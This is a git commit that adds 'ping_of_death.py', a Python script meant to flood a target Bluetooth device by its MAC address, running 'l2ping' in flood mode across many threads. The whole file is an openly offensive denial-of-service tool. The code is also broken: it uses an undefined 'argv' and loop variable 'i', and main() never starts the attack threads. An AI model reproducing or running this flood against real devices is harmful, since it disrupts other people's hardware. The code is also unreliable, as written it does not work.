036efedeee5bc31b6323c2f22e181e7cae381f6a
Ivan Nikolsky <enty8080@gmail.com>
2021-03-02 21:41:07 +0300

    Create ping_of_death.py

---
+++ ping_of_death.py
@@ -0,0 +1,37 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import threading
+
+class ping_of_death:
+    def __init__(self):
+        self.argv = sys.argv
+        self.argc = len(argv)
+
+    def run_attack_beacon(self):
+        os.system(f"l2ping -i hci0 -s 40 -f {self.mac_addr}")
+
+    def run_threads(self):
+        try:
+            for thread in range(self.threads):
+                print(f"[*] Running attack beacon #{str(thread)}...")
+                self.threads_list[i] = threading.Thread(target=self.run_attack_beacon)
+                self.threads_list[i].setDaemon(True)
+                self.threads_list[i].start()
+        except (KeyboardInterrupt, EOFError):
+            print(f"[-] Interrupted.")
+    
+    def main(self):
+        if self.argc < 3:
+            print("ping_of_death.py <threads> <mac_addr>")
+            return
+
+        self.threads = int(argv[1])
+        self.mac_addr = argv[2]
+    
+        self.threads_list = [None] * self.threads
+      
+if __name__ == '__main__':
+    ping_of_death = ping_of_death()
+    ping_of_death.main()
